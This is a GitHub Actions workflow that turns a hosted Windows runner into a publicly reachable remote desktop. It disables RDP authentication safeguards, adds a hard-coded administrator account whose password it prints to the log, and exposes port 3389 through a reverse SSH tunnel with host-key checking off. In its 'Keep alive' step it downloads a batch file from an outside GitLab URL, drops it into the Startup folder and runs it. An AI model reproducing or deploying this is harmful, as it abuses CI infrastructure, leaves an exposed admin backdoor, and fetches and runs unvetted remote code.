name: rdp-auto-tunnel

on:
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 350
    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          netsh advfirewall firewall delete rule name="RDP-Auto" 2>$null
          netsh advfirewall firewall add rule name="RDP-Auto" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP User
        run: |
          $pw = "T3legram@yoCND"
          $sp = ConvertTo-SecureString $pw -AsPlainText -Force
          if (-not (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue)) {
              New-LocalUser -Name "RDP" -Password $sp -AccountNeverExpires
          }
          Add-LocalGroupMember -Group "Administrators"       -Member "RDP" -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP" -ErrorAction SilentlyContinue

      - name: Install OpenSSH
        run: |
          Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
          Get-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

      - name: Start SSH tunnel via localhost.run
        shell: powershell
        run: |
          $logFile = "C:\tunnel.log"
          $sshArgs = @(
            "-o", "StrictHostKeyChecking=no",
            "-o", "ServerAliveInterval=60",
            "-R", "3389:localhost:3389",
            "nokey@localhost.run"
          )
          $proc = Start-Process -FilePath "ssh" -ArgumentList $sshArgs `
                    -RedirectStandardOutput $logFile `
                    -RedirectStandardError "C:\tunnel_err.log" `
                    -WindowStyle Hidden -PassThru
          Write-Host "SSH PID: $($proc.Id)"

          # wait for tunnel URL to appear in log
          $url = $null
          for ($i = 0; $i -lt 30; $i++) {
              Start-Sleep -Seconds 4
              if (Test-Path $logFile) {
                  $content = Get-Content $logFile -Raw -ErrorAction SilentlyContinue
                  if ($content) {
                      Write-Host "--- log so far ---"
                      Write-Host $content
                      # localhost.run prints lines like: tunneled with tls termination, https://xxx.lhr.life
                      # and also TCP lines: 1.tcp.eu.ngrok.io:PORT
                      $m = [regex]::Match($content, 'tunneled.*?(\S+\.lhr\.life)')
                      if ($m.Success) { $url = $m.Groups[1].Value; break }
                      # fallback: any hostname:port pattern
                      $m2 = [regex]::Match($content, '(\S+\.localhost\.run:\d+)')
                      if ($m2.Success) { $url = $m2.Groups[1].Value; break }
                  }
              }
              Write-Host "waiting for tunnel... ($i)"
          }

          if (-not $url) {
              Write-Host "=== TUNNEL ERROR LOG ==="
              Get-Content "C:\tunnel_err.log" -ErrorAction SilentlyContinue
              Write-Error "Tunnel URL not found in time"; exit 1
          }

          $parts = $url -replace "https://","" -split ":"
          $rdpHost = $parts[0]
          $rdpPort = if ($parts.Count -gt 1) { $parts[1] } else { "443" }

          Write-Host "=== RDP READY ==="
          Write-Host "HOST : $rdpHost"
          Write-Host "PORT : $rdpPort"
          Write-Host "USER : RDP"
          Write-Host "PASS : T3legram@yoCND"

          New-Item -ItemType Directory -Force -Path rdp_out | Out-Null
          "HOST=$rdpHost`nPORT=$rdpPort" | Out-File -FilePath rdp_out\rdp_info.txt -Encoding utf8

      - name: Upload RDP info
        uses: actions/upload-artifact@v4
        with:
          name: rdp-info
          path: rdp_out/rdp_info.txt

      - name: Keep alive
        run: |
          $rdpProfile  = "C:\Users\RDP"
          $startupPath = "$rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
          $batUrl      = "https://gitlab.com/MR.English2008/pcme_rdp/-/raw/main/Downloads.bat"
          $batDst      = "$startupPath\Downloads.bat"
          while ($true) {
              if (Test-Path $rdpProfile) {
                  if (-not (Test-Path $startupPath)) { New-Item -ItemType Directory -Path $startupPath -Force | Out-Null }
                  Invoke-WebRequest -Uri $batUrl -OutFile $batDst -UseBasicParsing
                  cmd /c $batDst
                  break
              }
              Write-Host "[$(Get-Date -f HH:mm:ss)] waiting for RDP profile..."
              Start-Sleep -Seconds 20
          }
          while ($true) {
              Write-Host "[$(Get-Date -f HH:mm:ss)] alive"
              Start-Sleep -Seconds 300
          }
